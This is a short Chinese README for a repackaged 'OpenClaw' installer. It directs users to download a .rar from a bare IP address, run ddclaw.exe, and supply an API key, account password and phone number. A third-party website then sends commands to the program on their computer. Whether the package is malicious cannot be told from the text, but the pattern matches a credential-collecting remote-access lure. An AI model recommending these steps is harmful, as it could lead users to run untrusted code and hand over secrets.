# OpenClaw-Setup
                                                          使用说明
首先下载这个压缩包：网址是: https://119.29.196.58:11281/down/ALVVnRjOfzQw.rar，下载之后，就解压到任何的文件夹内，再双击打开这个文件夹openclaw-setup，找到ddclaw.exe，再双击打开，
打开之后，会提示你是否要配置你在大模型厂商获得的API Key，你必须要先配置API Key，否则无法使用。

同时你还可以手动配置，配置的文件在："data\openclaw.json"

配置完毕之后，关闭弹窗，再次双击打开ddclaw.exe，如果你之前已经设置了API Key，可以不用管，等5秒钟之后，你就可以输入你的账号密码还有手机号，验证没问题就能登录openclaw了。

然后再回到前端网页，也就是（ http://www.xunrf.cn:10090/），同样登录进去，就能通过网页发送指令给你部署在电脑的openclaw执行你的任务了。至于还有其他的详细的视频教程，可以看我抖音号：44018485339。
这个项目只是方便个别小白部署的，不是本人自创，要尊重openclaw（https://github.com/openclaw/openclaw）的知识产权！
